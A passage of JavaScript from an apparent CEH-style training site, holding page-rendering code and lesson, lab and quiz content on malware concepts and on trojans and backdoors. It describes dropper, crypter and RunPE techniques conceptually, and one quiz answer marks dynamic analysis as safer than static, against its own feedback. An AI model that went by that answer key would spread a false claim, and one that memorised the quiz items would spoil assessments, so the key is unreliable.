
const CONTENT = {};

function buildTopicHTML(id, d){
  const hasContent = !!CONTENT[id];
  return `
  <div class="topic-header">
    <div class="topic-eyebrow">${d.module||''}</div>
    <div class="topic-title">${d.title}</div>
    <div class="topic-sub">${d.sub}</div>
    ${d.killchain ? `<div style="margin-top:12px;">
      <span class="kc-badge">⛓ ${d.killchain.phase}</span>
      <span class="mitre-badge">🎯 MITRE: ${d.killchain.mitre}</span>
    </div>` : ''}
  </div>

  <div class="topic-tabs">
    <button class="tab-btn active" data-tab="learn">📚 Learn</button>
    <button class="tab-btn" data-tab="diagram">🔄 Diagram &amp; Workflow</button>
    <button class="tab-btn" data-tab="enterprise">🏢 Enterprise (GFS)</button>
    <button class="tab-btn" data-tab="commands">💻 Commands</button>
    <button class="tab-btn" data-tab="pitfalls">⚠️ Pitfalls &amp; Security</button>
    <button class="tab-btn" data-tab="lab">🔬 Hands-On Lab</button>
    <button class="tab-btn" data-tab="assessment">🎯 Assessment</button>
    <button class="tab-btn" data-tab="summary">📋 Summary</button>
  </div>

  <!-- LEARN -->
  <div class="tab-pane active" data-pane="learn">
    ${buildLearnHTML(d)}
  </div>

  <!-- DIAGRAM -->
  <div class="tab-pane" data-pane="diagram">
    ${buildDiagramHTML(d)}
  </div>

  <!-- ENTERPRISE -->
  <div class="tab-pane" data-pane="enterprise">
    ${buildEnterpriseHTML(d)}
  </div>

  <!-- COMMANDS + TERMINAL -->
  <div class="tab-pane" data-pane="commands">
    ${buildCommandsHTML(d)}
    </div>

  <!-- PITFALLS -->
  <div class="tab-pane" data-pane="pitfalls">
    ${buildPitfallsHTML(d)}
  </div>

  <!-- HANDS-ON LAB -->
  <div class="tab-pane" data-pane="lab">
    ${buildLabHTML(d)}
  </div>

  <!-- ASSESSMENT -->
  <div class="tab-pane" data-pane="assessment">
    ${buildAssessmentHTML(d)}
  </div>

  <!-- SUMMARY -->
  <div class="tab-pane" data-pane="summary">
    ${buildSummaryHTML(id,d)}
  </div>
  `;
}
function buildComingSoonHTML(icon,message){
  return `<div class="classified-card"><div class="classified-icon">${icon}</div><div class="classified-title">${message}</div><div class="classified-bar"></div><div class="classified-sub">ShadowXLab analysts are preparing this content. Check back soon.</div></div>`;
}
function buildLearnHTML(d){
  if(!d.learn||!d.learn.simple) return buildComingSoonHTML('\u{1F4DA}','Learn content is being prepared');
  return `
  <div class="mission-grid">
    <div class="info-card"><div class="card-label">SIMPLE EXPLANATION</div><div class="card-text">${d.learn.simple}</div></div>
    <div class="info-card"><div class="card-label">ANALOGY</div><div class="card-text">${d.learn.analogy}</div></div>
    <div class="info-card"><div class="card-label">WHY IT EXISTS</div><div class="card-text">${d.learn.why}</div></div>
    <div class="info-card"><div class="card-label">HOW IT WORKS</div><div class="card-text">${d.learn.architecture}</div></div>
  </div>`;
}
function buildDiagramHTML(d){
  if(!d.diagram||!d.diagram.steps||!d.diagram.steps.length) return buildComingSoonHTML('\u{1F504}','Diagram & Workflow is being designed');
  return `
  <div style="background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:28px;">
    <div style="font-size:1rem;font-weight:700;color:var(--blue);margin-bottom:24px;font-family:var(--mono);">${d.diagram.title||'Process Flow'}</div>
    <div class="diagram-flow">
      ${d.diagram.steps.map((s,i)=>`
        <div class="diagram-step">
          <div class="diagram-step-icon">${s.icon||'▶'}</div>
          <div class="diagram-step-body">
            <div class="diagram-step-label">Step ${i+1}: ${s.label}</div>
            <div class="diagram-step-desc">${s.desc}</div>
          </div>
        </div>
        ${i<d.diagram.steps.length-1?'<div class="diagram-arrow">↓</div>':''}
      `).join('')}
    </div>
  </div>`;
}
function buildEnterpriseHTML(d){
  if(!d.enterprise) return buildComingSoonHTML('\u{1F3E2}','Enterprise scenario is being written');
  const e=d.enterprise;
  return `
  <div style="background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:28px;">
    <div style="display:flex;align-items:center;gap:14px;margin-bottom:24px;">
      <div style="font-size:2.2rem;">\u{1F3E2}</div>
      <div>
        <div style="font-size:0.7rem;font-family:var(--mono);color:var(--green);letter-spacing:0.12em;">ENTERPRISE SCENARIO — GLOBALFINSEC CORP</div>
        <div style="font-size:1rem;font-weight:700;color:var(--text);">${e.role||'Lead Penetration Tester'}</div>
      </div>
    </div>
    <div class="enterprise-grid">
      <div class="ent-card ent-situation"><div class="ent-label">\u{1F4CB} SITUATION</div><div class="ent-text">${e.situation||''}</div></div>
      <div class="ent-card ent-challenge"><div class="ent-label">\u{1F3AF} YOUR CHALLENGE</div><div class="ent-text">${e.challenge||''}</div></div>
    </div>
    ${e.steps&&e.steps.length?`<div style="margin-top:20px;">
      <div style="font-family:var(--mono);font-size:0.72rem;color:var(--text-muted);letter-spacing:0.1em;margin-bottom:12px;">// YOUR INVESTIGATION STEPS</div>
      ${e.steps.map((s,i)=>`<div style="display:flex;gap:12px;align-items:flex-start;margin-bottom:10px;padding:12px;background:rgba(0,0,0,0.3);border-radius:8px;border-left:3px solid var(--green);"><span style="font-family:var(--mono);color:var(--green);font-size:0.75rem;min-width:20px;">${i+1}.</span><span style="font-size:0.88rem;color:var(--text);">${s}</span></div>`).join('')}
    </div>`:''}
    <div class="ent-card" style="margin-top:20px;background:rgba(0,200,83,0.08);border-color:rgba(0,200,83,0.3);">
      <div class="ent-label">\u2705 OUTCOME &amp; LESSON</div>
      <div class="ent-text"><strong>Outcome:</strong> ${e.outcome||''}</div>
      <div class="ent-text" style="margin-top:8px;"><strong>Key Lesson:</strong> ${e.lesson||''}</div>
    </div>
  </div>`;
}
function buildCommandsHTML(d){
  const tools=d.tools||[];
  const cmds=d.commands||{win:[],lin:[]};
  
  let toolsHtml = '';
  if(tools.length){
    toolsHtml = `<div style="margin-bottom:24px;"><div class="card-label" style="margin-bottom:12px;">KEY TOOLS</div><div class="tool-grid">` + 
      tools.map(t => {
        const aiDesc = t.desc.includes('AI') ? t.desc : `AI models can automate ${t.name} by parsing its raw output, correlating vulnerabilities with external threat feeds, and autonomously verifying exploit paths.`;
        return `
        <div class="tool-card">
          <div class="tool-header">
            <div class="tool-name">${t.name}</div>
            <div class="tool-cmd" onclick="runCommand('lin', '${t.cmd}')" style="cursor:pointer" title="Click to run in Linux Terminal">$ ${t.cmd}</div>
          </div>
          <div class="tool-body">
            <div class="tool-col trad">
              <div class="tool-lbl">TRADITIONAL USAGE</div>
              <div class="tool-desc">${t.desc}</div>
            </div>
            <div class="tool-col">
              <div class="tool-lbl" style="color:var(--purple)">✨ AI-POWERED EVOLUTION</div>
              <div class="tool-desc">${aiDesc}</div>
            </div>
          </div>
        </div>`;
      }).join('') + `</div></div>`;
  }

  return `
  ${toolsHtml}
  <div class="cmd-grid">
    <div class="cmd-block">
      <div class="cmd-os">▶ WINDOWS COMMANDS (Click to execute)</div>
      ${cmds.win&&cmds.win.length?cmds.win.map(c=>{let s=typeof c==='string'?c:(c.cmd||'');return `<div class="cmd-line clickable-cmd" onclick="runCommand('win', '${s.replace(/'/g,"\'").replace(/"/g,'&quot;')}')">${s}</div>`}).join(''):'<div style="color:var(--text-dim);font-size:0.8rem;padding:8px;">No Windows commands.</div>'}
    </div>
    <div class="cmd-block">
      <div class="cmd-os">▶ LINUX / KALI COMMANDS (Click to execute)</div>
      ${cmds.lin&&cmds.lin.length?cmds.lin.map(c=>{let s=typeof c==='string'?c:(c.cmd||'');return `<div class="cmd-line clickable-cmd" onclick="runCommand('lin', '${s.replace(/'/g,"\'").replace(/"/g,'&quot;')}')">${s}</div>`}).join(''):'<div style="color:var(--text-dim);font-size:0.8rem;padding:8px;">No Linux commands.</div>'}
    </div>
  </div>`;
}
function buildPitfallsHTML(d){
  if(!d.pitfalls||!d.pitfalls.length) return buildComingSoonHTML('\u26A0','Pitfalls & Security analysis is being prepared');
  return `<div style="display:flex;flex-direction:column;gap:16px;">${d.pitfalls.map((p,i)=>`
    <div style="background:rgba(255,59,92,0.07);border:1px solid rgba(255,59,92,0.25);border-radius:var(--radius);padding:20px;">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
        <span style="font-size:1.3rem;">${p.icon||'\u26A0'}</span>
        <span style="font-weight:700;color:var(--red);font-size:0.95rem;">${p.title}</span>
        <span style="margin-left:auto;font-family:var(--mono);font-size:0.65rem;background:rgba(255,59,92,0.15);color:var(--red);padding:3px 8px;border-radius:20px;">PITFALL #${i+1}</span>
      </div>
      <div style="font-size:0.87rem;color:var(--text);margin-bottom:10px;">${p.desc}</div>
      <div style="background:rgba(0,200,83,0.08);border:1px solid rgba(0,200,83,0.2);border-radius:8px;padding:10px;">
        <span style="font-family:var(--mono);font-size:0.7rem;color:var(--green);">\u2713 FIX: </span>
        <span style="font-size:0.84rem;color:var(--text-muted);">${p.fix}</span>
      </div>
    </div>
  `).join('')}</div>`;
}
function buildLabHTML(d){
  if(!d.lab) return buildComingSoonHTML('🔬','Hands-On Lab is being designed');
  const dc={'Beginner':'var(--green)','Intermediate':'var(--blue)','Advanced':'var(--red)'};
  const color=dc[d.lab.difficulty]||'var(--text-dim)';
  
  const stepsHtml = d.lab.steps.map((s,i)=>{
    // Make text in backticks clickable to terminal
    let formattedText = s.replace(/`([^`]+)`/g, '<span class="clickable-cmd" style="color:var(--blue);background:rgba(0,170,255,0.1);padding:2px 6px;border-radius:4px;font-family:var(--mono);" onclick="runCommand(\'lin\', \'$1\')">$1</span>');
    return `<div class="lab-step" style="cursor:pointer;" onclick="toggleLabStep(this)"><div class="lab-step-num">${i+1}</div><div class="lab-step-text">${formattedText}</div><span class="lab-check" style="opacity:0;">✓</span></div>`;
  }).join('');

  return `
  <div style="background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:24px;">
    <div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
      <div>
        <div style="font-size:1.1rem;font-weight:700;color:var(--green);">🔬 ${d.lab.title}</div>
      </div>
      <div style="display:flex;flex-direction:column;gap:6px;align-items:flex-end;">
        <span style="font-family:var(--mono);font-size:0.7rem;background:rgba(0,0,0,0.4);border:1px solid var(--border);padding:4px 10px;border-radius:20px;color:${color};">${d.lab.difficulty||'Beginner'}</span>
      </div>
    </div>
    ${stepsHtml}
  </div>`;
}
// -- TAB 7: ASSESSMENT --
function buildAssessmentHTML(d){
  return `
  <div style="margin-bottom:32px;">
    <div style="font-family:var(--mono);font-size:0.72rem;color:var(--text-muted);letter-spacing:0.1em;margin-bottom:16px;padding:10px;background:rgba(0,0,0,0.3);border-radius:8px;">// SECTION 1 OF 3 — KNOWLEDGE CHECK</div>
    <div class="quiz-score" id="quiz-score" style="display:none;"></div>
    ${buildQuizHTML(d)}
  </div>
  <div style="margin-bottom:32px;">
    <div style="font-family:var(--mono);font-size:0.72rem;color:var(--text-muted);letter-spacing:0.1em;margin-bottom:16px;padding:10px;background:rgba(0,0,0,0.3);border-radius:8px;">// SECTION 2 OF 3 — FLASHCARDS (hover to flip)</div>
    ${buildFlashcardsHTML(d)}
  </div>
  <div>
    <div style="font-family:var(--mono);font-size:0.72rem;color:var(--text-muted);letter-spacing:0.1em;margin-bottom:16px;padding:10px;background:rgba(0,0,0,0.3);border-radius:8px;">// SECTION 3 OF 3 — CAPTURE THE FLAG</div>
    ${buildCTFHTML(d)}
  </div>`;
}

// -- TAB 8: SUMMARY --
function buildSummaryHTML(id,d){
  const isDone=!!completed[id];
  return `
  <div style="background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:28px;">
    <div style="font-size:1rem;font-weight:700;color:var(--green);margin-bottom:20px;font-family:var(--mono);">// KEY TAKEAWAYS — EXAM READY</div>
    ${d.summary&&d.summary.length?`<ul class="summary-list">${d.summary.map(s=>`<li>${s}</li>`).join('')}</ul>`:'<div style="color:var(--text-dim);">Summary content coming soon.</div>'}
    <div style="margin-top:32px;padding-top:24px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;">
      <div id="complete-status-${id}" style="font-family:var(--mono);font-size:0.8rem;color:var(--text-dim);">
        ${isDone?'<span style="color:var(--green);">\u2713 TOPIC COMPLETED — XP AWARDED</span>':'Complete all sections, then mark done to earn XP.'}
      </div>
      <button class="btn-complete" id="btn-complete-${id}" onclick="markComplete('${id}')"
        ${isDone?'disabled style="opacity:0.5;cursor:default;"':''}>
        ${isDone?'\u2713 COMPLETED':'\u2714 MARK COMPLETE — EARN 200 XP'}
      </button>
    </div>
  </div>`;
}

// -- QUIZ --
function buildQuizHTML(d){
  if(!d.quiz||!d.quiz.length) return buildComingSoonHTML('\u2753','Quiz — 10 questions coming soon');
  return d.quiz.map((q,i)=>`
    <div class="quiz-q" data-qi="${i}" data-correct="${q.correct}">
      <div class="quiz-q-num">QUESTION ${String(i+1).padStart(2,'0')} / ${d.quiz.length}</div>
      <div class="quiz-q-text">${q.q}</div>
      <div class="quiz-opts">${q.opts.map((o,oi)=>`<button class="quiz-opt" data-oi="${oi}" onclick="answerQuiz(this,${i},${oi})">${o}</button>`).join('')}</div>
      <div class="quiz-fb">${q.fb}</div>
    </div>
  `).join('');
}

// -- FLASHCARDS --
function buildFlashcardsHTML(d){
  if(!d.flashcards||!d.flashcards.length) return buildComingSoonHTML('\u{1F0CF}','Flashcards coming soon');
  return `
  <div style="margin-bottom:10px;font-family:var(--mono);font-size:0.75rem;color:var(--text-muted);">// Hover a card to flip and reveal the definition</div>
  <div class="flashcards-grid">${d.flashcards.map(f=>`<div class="flashcard"><div class="fc-front">${f.f}</div><div class="fc-back">${f.b}</div></div>`).join('')}</div>`;
}

// -- CTF --
function buildCTFHTML(d){
  const ctf=d.ctf||{scenario:'Complete all sections to unlock the CTF challenge.',hint:'Study the Learn and Commands tabs first.',flag:'',points:150};
  return `
  <div class="ctf-card">
    <div class="ctf-header"><div class="ctf-flag-icon">\u{1F6A9}</div><div><div class="ctf-title">CAPTURE THE FLAG</div><div class="ctf-subtitle">// CLASSIFIED INTELLIGENCE CHALLENGE</div></div></div>
    <div class="ctf-points">\u{1F48E} ${ctf.points||150} POINTS</div>
    <div class="ctf-scenario">${ctf.scenario}</div>
    <div class="ctf-hint" id="ctf-hint" onclick="revealHint(this)" data-hint="${ctf.hint||''}">\u{1F4A1} HINT: Click to reveal (costs no points)</div>
    <div class="ctf-input-row">
      <input class="ctf-input" id="ctf-flag-input" placeholder="CEH{your_flag_here}" autocomplete="off" spellcheck="false"/>
      <button class="ctf-submit" onclick="submitCTF('${currentTopic}')">SUBMIT FLAG</button>
    </div>
    <div class="ctf-result" id="ctf-result"></div>
  </div>`;
}


async function showAdminPanel(){
  document.querySelectorAll('#content-area > div').forEach(el => el.style.display='none');
  document.getElementById('admin-panel').style.display='block';
  
  // Fetch users
  try {
    const token = localStorage.getItem('ceh_token');
    const res = await fetch('/api/users', { headers: { 'Authorization': 'Bearer ' + token }});
    if(!res.ok) throw new Error('Failed to fetch');
    const users = await res.json();
    
    document.getElementById('admin-tot-ops').textContent = users.length;
    let totalXp = 0;
    
    let trs = '';
    users.forEach(u => {
      totalXp += (u.total_xp || 0);
      const roleHtml = u.role === 'admin' ? '<span style="color:var(--red);border:1px solid var(--red);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:0.6rem;">ADMIN</span>' : '<span style="color:var(--cyan);border:1px solid var(--cyan);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:0.6rem;">OPERATOR</span>';
      trs += `<tr style="border-bottom:1px solid rgba(255,255,255,0.05);"><td style="padding:16px;">${u.email}</td><td style="padding:16px;">${roleHtml}</td><td style="padding:16px;color:var(--green);font-family:var(--mono);">${u.total_xp || 0}</td><td style="padding:16px;">${u.tasks_completed || 0}</td><td style="padding:16px;color:var(--text-muted);font-size:0.7rem;">${new Date(u.created_at).toLocaleDateString()}</td></tr>`;
    });
    
    document.getElementById('admin-tot-xp').textContent = totalXp;
    document.getElementById('admin-users-list').innerHTML = trs;
  } catch(e) {
    console.error(e);
  }
}

CONTENT['malware-concepts'] = {
  "eyebrow": "Module 07 \u00b7 Topic 1",
  "title": "Malware Concepts",
  "module": "Phase 07: Malware Analyst",
  "sub": "Static vs Dynamic, APTs, and Droppers",
  "objectives": [
    "Understand static vs dynamic analysis",
    "Identify APT characteristics",
    "Explain malware droppers"
  ],
  "learn": {
    "simple": "Malware concepts encompass the fundamental theories of malicious software, including how it is created, propagated, and analyzed. Understanding the difference between static (examining code without running it) and dynamic (running it in a sandbox) analysis is key. Advanced Persistent Threats (APTs) represent sophisticated, long-term attacks, often state-sponsored, while droppers are specialized malware designed to install other malware.",
    "analogy": "Think of a dropper as a trojan horse that smuggles an army (the actual malware payload) into a fortress (your computer). Static analysis is like reading the blueprints of the horse, while dynamic analysis is watching the horse operate in a safe, contained environment.",
    "architecture": "A typical malware dropper is a lightweight executable, often polymorphic or packed to evade detection. Once executed, it reaches out to a Command and Control (C2) server to download the primary payload, decrypts it in memory, and executes it, typically employing process hollowing or DLL injection. APTs leverage these droppers as part of a multi-stage kill chain, establishing persistence through registry keys, WMI subscriptions, or scheduled tasks.",
    "why": "Understanding these concepts is critical for enterprise defense because modern malware frequently evades traditional antivirus through obfuscation and multi-stage delivery mechanisms. Defense-in-depth requires analyzing both the delivery mechanism (dropper) and the payload."
  },
  "enterprise": {
    "gfs": "At Global Financial Services, we observed an incident where a phishing email delivered a dropper disguised as a PDF. It attempted to download a banking trojan, but our EDR flagged the anomalous network connection.",
    "windows": "In Windows, malware droppers often abuse legitimate binaries (Living off the Land) like bitsadmin.exe or powershell.exe to download payloads.",
    "linux": "On Linux, attackers may use curl or wget in bash scripts, establishing persistence via cron jobs or systemd services."
  },
  "workflow": [
    "Step 1: Identify suspicious file.",
    "Step 2: Isolate the system.",
    "Step 3: Perform static analysis.",
    "Step 4: Perform dynamic analysis.",
    "Step 5: Extract IOCs.",
    "Step 6: Update defenses."
  ],
  "diagram": {
    "caption": "Click to interact with the diagram",
    "svg": "<svg viewBox=\"0 0 600 400\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"50\" y=\"50\" width=\"100\" height=\"50\" fill=\"#f00\"/><text x=\"75\" y=\"80\">Dropper</text></svg>"
  },
  "commands": {
    "lin": [
      {
        "cmd": "strings suspicious_file | grep http",
        "purpose": "Extract URLs from dropper",
        "out": "http://c2.example.com",
        "note": "Basic static analysis",
        "mistake": "Running the executable instead of strings"
      }
    ],
    "win": [
      {
        "cmd": "Get-FileHash suspicious_file.exe",
        "purpose": "Calculate hash for OSINT lookup",
        "out": "SHA256 hash",
        "note": "Check VirusTotal",
        "mistake": "Relying only on MD5"
      }
    ]
  },
  "lab": {
    "type": "guided",
    "difficulty": "Advanced",
    "duration": "45",
    "platform": "Kali Linux",
    "environment": "Local Lab",
    "tools": [
      "YARA",
      "Cuckoo"
    ],
    "dependencies": [],
    "safety": [
      "Perform this lab only in an isolated sandbox environment."
    ],
    "scenario": "GFS incident response team needs to analyze a suspected dropper found on a trading terminal.",
    "objectives": [
      "Identify the C2 domain using static analysis."
    ],
    "steps": [
      "Step 1: Run strings against the malware sample with `strings sample.exe`."
    ],
    "evidence": [
      "Terminal output showing the extracted domain."
    ],
    "validation": [
      "You should see: evil-c2.com"
    ],
    "troubleshooting": [
      "If no output, try using a deobfuscator."
    ],
    "mitre": [
      {
        "id": "T1106",
        "name": "Native API",
        "tactic": "Execution"
      }
    ],
    "cleanup": [
      "Revert the sandbox VM."
    ]
  },
  "quiz": [
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is the primary function of a malware dropper?",
      "opts": [
        "To encrypt files",
        "To download and install other malware",
        "To steal passwords",
        "To launch DDoS attacks"
      ],
      "correct": 1,
      "fb": "A dropper\'s main purpose is to 'drop' or install the primary malware payload onto the system."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which analysis method involves executing the malware?",
      "opts": [
        "Static analysis",
        "Dynamic analysis",
        "Heuristic analysis",
        "Signature analysis"
      ],
      "correct": 1,
      "fb": "Dynamic analysis involves running the malware in a controlled environment to observe its behavior."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What does APT stand for?",
      "opts": [
        "Advanced Persistent Threat",
        "Automated Phishing Tool",
        "Active Process Tracker",
        "Advanced Payload Trojan"
      ],
      "correct": 0,
      "fb": "APT stands for Advanced Persistent Threat, typically state-sponsored actors."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Static analysis requires running the malware in a sandbox.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. Static analysis examines the code without executing it."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Advanced",
      "q": "Which technique is commonly used by droppers to evade static analysis?",
      "opts": [
        "Code signing",
        "Packing",
        "Network encryption",
        "Privilege escalation"
      ],
      "correct": 1,
      "fb": "Packing compresses and obfuscates the executable, making static analysis difficult."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is a C2 server?",
      "opts": [
        "Command and Control server",
        "Cryptographic Calculation server",
        "Client-to-Client server",
        "Core Configuration server"
      ],
      "correct": 0,
      "fb": "C2 stands for Command and Control, used by attackers to manage malware."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Droppers always contain the full malware payload within themselves.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. They often download the payload from a C2 server."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which of the following is a characteristic of an APT?",
      "opts": [
        "Short-term attack",
        "Random targets",
        "Long-term persistence",
        "Loud, disruptive attacks"
      ],
      "correct": 2,
      "fb": "APTs aim to maintain long-term, undetected access to the target network."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Advanced",
      "q": "What is process hollowing?",
      "opts": [
        "A denial of service attack",
        "Injecting malicious code into a legitimate process",
        "Deleting system files",
        "Extracting passwords from memory"
      ],
      "correct": 1,
      "fb": "Process hollowing involves replacing the code of a legitimate process with malicious code."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Dynamic analysis is safer than static analysis because the malware is contained.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 0,
      "fb": "True, but both have their uses. Static analysis is inherently safe because the code isn\'t executed."
    }
  ],
  "flashcards": [
    {
      "f": "Dropper",
      "b": "Malware designed to install other malware payloads."
    },
    {
      "f": "APT",
      "b": "Advanced Persistent Threat; a sophisticated, long-term cyberattack."
    }
  ],
  "summary": [
    "Malware concepts include droppers, APTs, and analysis techniques.",
    "Static analysis examines code without running it.",
    "Dynamic analysis observes malware behavior in a sandbox.",
    "Droppers deliver primary payloads.",
    "APTs are stealthy, long-term threats."
  ],
  "outcomes": [
    "Explain static vs dynamic analysis.",
    "Identify characteristics of APTs and droppers."
  ],
  "meta": {
    "contentVersion": "1.0.0",
    "estimatedTime": 45,
    "difficulty": "Advanced",
    "prerequisites": [],
    "lastReviewed": "2026-07-18"
  }
};

CONTENT['trojans-backdoors'] = {
  "eyebrow": "Module 07 \u00b7 Topic 2",
  "title": "Trojans and Backdoors",
  "module": "Phase 07: Malware Analyst",
  "sub": "RATs, Banking Trojans, Wrappers, and Crypters",
  "objectives": [
    "Understand RAT capabilities",
    "Identify banking trojans",
    "Explain wrappers and crypters"
  ],
  "learn": {
    "simple": "Trojans disguise themselves as legitimate software to trick users into executing them. Once running, they can establish backdoors, allowing attackers unauthorized access. Remote Access Trojans (RATs) provide full control over the compromised system. Banking trojans specifically target financial information, while wrappers and crypters are tools used by attackers to hide malware from antivirus software.",
    "analogy": "A trojan is like a Greek wooden horse. It looks like a gift (a legitimate app), but inside are soldiers (malicious code). A crypter is like a cloaking device that hides the horse from guards (antivirus) until it\'s inside the city walls.",
    "architecture": "Banking trojans like TrickBot or Emotet use web injects to modify banking pages in the victim\'s browser, capturing credentials. RATs establish a reverse TCP shell back to the C2 server, bypassing inbound firewall rules. Attackers use crypters to encrypt the malware payload; the executable includes a small stub that decrypts the payload in memory at runtime, a technique known as 'RunPE'.",
    "why": "Trojans are a primary vector for initial access in enterprise breaches. The use of crypters makes detection based on traditional signatures ineffective, necessitating behavioral analysis."
  },
  "enterprise": {
    "gfs": "GFS thwarted an attack where a fake software update wrapper delivered a banking trojan designed to intercept wire transfer approvals.",
    "windows": "Trojans often exploit Windows user privileges, tricking users into accepting UAC prompts to gain SYSTEM access.",
    "linux": "Linux backdoors may modify SSH binaries or install rootkits to maintain access."
  },
  "workflow": [
    "Step 1: Monitor network traffic for unusual connections.",
    "Step 2: Investigate unknown processes.",
    "Step 3: Analyze startup items and registry keys.",
    "Step 4: Contain the infected host.",
    "Step 5: Reverse engineer the payload.",
    "Step 6: Deploy IoCs to security appliances."
  ],
  "diagram": {
    "caption": "Click to interact with the diagram",
    "svg": "<svg viewBox=\"0 0 600 400\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"300\" cy=\"200\" r=\"50\" fill=\"#00f\"/><text x=\"280\" y=\"205\" fill=\"#fff\">Trojan</text></svg>"
  },
  "commands": {
    "lin": [
      {
        "cmd": "netstat -anp | grep ESTABLISHED",
        "purpose": "Find active connections",
        "out": "IP addresses and PIDs",
        "note": "Look for unusual ports",
        "mistake": "Ignoring short-lived connections"
      }
    ],
    "win": [
      {
        "cmd": "netstat -ano | findstr ESTABLISHED",
        "purpose": "Find active connections",
        "out": "IP addresses and PIDs",
        "note": "Correlate PID with task manager",
        "mistake": "Not running as administrator"
      }
    ]
  },
  "lab": {
    "type": "guided",
    "difficulty": "Advanced",
    "duration": "45",
    "platform": "Windows 10",
    "environment": "Local Lab",
    "tools": [
      "Process Hacker",
      "Wireshark"
    ],
    "dependencies": [],
    "safety": [
      "Perform this lab only in an isolated sandbox environment."
    ],
    "scenario": "Investigate a workstation suspected of hosting a RAT connecting to an external C2.",
    "objectives": [
      "Identify the malicious process and its C2 IP."
    ],
    "steps": [
      "Step 1: Run netstat to find established connections with `netstat -ano`."
    ],
    "evidence": [
      "Screenshot of the malicious connection."
    ],
    "validation": [
      "You should see: connection to 10.10.10.55 on port 4444"
    ],
    "troubleshooting": [
      "If process terminates, check persistence mechanisms."
    ],
    "mitre": [
      {
        "id": "T1071",
        "name": "Application Layer Protocol",
        "tactic": "Command and Control"
      }
    ],
    "cleanup": [
      "Revert the sandbox VM."
    ]
  },
  "quiz": [
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is the main purpose of a RAT?",
      "opts": [
        "To steal passwords locally",
        "To provide remote administrative control to the attacker",
        "To encrypt files for ransom",
        "To spread to other computers"
      ],
      "correct": 1,
      "fb": "RAT stands for Remote Access Trojan, giving the attacker control over the infected system."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What tool do attackers use to combine a legitimate executable with a malicious one?",
      "opts": [
        "Crypter",
        "Wrapper",
        "Packer",
        "Obfuscator"
      ],
      "correct": 1,
      "fb": "A wrapper combines two executables into one."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Banking trojans only steal data; they do not alter web pages.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. They often use web injects to alter what the user sees on banking sites."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Advanced",
      "q": "How does a crypter evade antivirus detection?",
      "opts": [
        "By changing the file extension",
        "By encrypting the malicious payload and decrypting it in memory",
        "By deleting the antivirus software",
        "By hiding in the recycle bin"
      ],
      "correct": 1,
      "fb": "Crypters encrypt the payload on disk, only decrypting it when run in memory."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "Which of the following is a common persistence mechanism for Windows trojans?",
      "opts": [
        "/etc/shadow",
        "Registry Run keys",
        "cron jobs",
        "DNS cache"
      ],
      "correct": 1,
      "fb": "Registry Run keys are a very common way for malware to start on Windows boot."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Trojans typically self-replicate to spread across a network.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. Trojans require user interaction (like clicking a link or running a file) to spread. Viruses and worms self-replicate."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is 'RunPE'?",
      "opts": [
        "A process enumeration tool",
        "A technique to run executables from memory, often used by crypters",
        "A Windows built-in security feature",
        "A type of ransomware"
      ],
      "correct": 1,
      "fb": "RunPE (Run Portable Executable) is a technique for loading an executable directly into memory, bypassing disk scanning."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Intermediate",
      "q": "What is the primary difference between a backdoor and a trojan?",
      "opts": [
        "A trojan is the delivery mechanism; a backdoor is the access provided",
        "A backdoor is hardware; a trojan is software",
        "They are the exact same thing",
        "A backdoor requires physical access"
      ],
      "correct": 0,
      "fb": "A trojan is how the malware gets in (disguised), while the backdoor is the unauthorized access channel it creates."
    },
    {
      "type": "multiple-choice",
      "difficulty": "Advanced",
      "q": "Which technique do banking trojans use to intercept credentials before they are encrypted by TLS?",
      "opts": [
        "DNS spoofing",
        "ARP poisoning",
        "Form grabbing / Web injects",
        "MAC flooding"
      ],
      "correct": 2,
      "fb": "Form grabbing and web injects capture the data within the browser before it hits the network stack."
    },
    {
      "type": "true-false",
      "difficulty": "Easy",
      "q": "Using a wrapper guarantees the malware will bypass antivirus.",
      "opts": [
        "True",
        "False"
      ],
      "correct": 1,
      "fb": "False. Modern AV can unpack or dynamically analyze wrapped files."
    }
  ],
  "flashcards": [
    {
      "f": "RAT",
      "b": "Remote Access Trojan, giving an attacker control."
    },
    {
      "f": "Crypter",
      "b": "Software used to encrypt malware to evade AV detection."
    }
  ],
  "summary": [
    "Trojans disguise themselves as legitimate software.",
    "RATs provide remote control to attackers.",
    "Banking trojans target financial data using web injects.",
